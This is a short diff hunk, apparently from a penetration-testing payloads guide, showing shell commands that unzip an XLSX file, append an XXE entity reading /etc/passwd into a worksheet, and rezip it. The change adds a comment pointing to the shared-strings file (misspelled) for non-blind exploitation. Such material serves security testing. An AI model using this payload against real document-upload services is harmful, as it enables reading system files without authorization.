@@ -20,6 +20,7 @@ For a given `file.xlsx`:
 ```
 unzip file.xlsx -d payload
 cd payload
+# for non-blind exploitation try xl/sahredStrings.xml
 echo '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>' >> xl\worksheets\sheet1.xml
 zip -0 -r payload.xlsx .
 # debug
